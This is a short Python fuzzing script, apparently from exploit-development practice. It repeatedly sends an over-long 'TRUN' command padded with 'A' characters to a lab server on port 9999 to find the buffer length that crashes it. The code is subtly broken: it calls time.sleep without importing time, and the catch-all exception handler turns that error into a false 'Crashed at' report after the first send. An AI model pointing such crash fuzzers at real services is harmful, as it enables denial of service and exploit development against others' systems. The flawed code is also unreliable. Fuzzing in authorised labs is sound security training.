import socket
import sys

numberofchar = 100

string_to_send = "TRUN /.:/" + "A" * numberofchar
while True:
    try:
        mySocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        mySocket.connect(("10.0.2.15",9999))
        mySocket.send(string_to_send.encode(encoding="latin1"))
        mySocket.close()
        string_to_send = string_to_send + "A" * 100
        time.sleep(1)
    except KeyboardInterrupt:
        print("Crashed at: " + str(len(string_to_send)))
        sys.exit()
    except Exception:
        print("Crashed at: " + str(len(string_to_send)))
        sys.exit()
        
